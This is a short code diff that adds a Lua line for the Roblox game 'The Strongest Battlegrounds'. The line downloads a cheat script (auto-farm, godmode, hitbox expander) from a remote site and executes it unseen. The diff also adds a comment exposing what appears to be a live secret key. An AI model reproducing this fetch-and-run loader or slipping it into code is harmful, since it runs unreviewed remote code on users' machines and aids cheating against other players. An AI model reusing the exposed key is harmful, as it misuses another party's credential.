@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/The-Strongest-Battlegrounds-AUTO-FARM-DESYNC-GODMODE-AUTO-STREAK-HITBOX-EXPANDER-122446"))()
+-- key: mk_live_nDDYbEQq4XrU9QYkVAyfcpCUXagLeFJ8BhWdc6J8c5Y
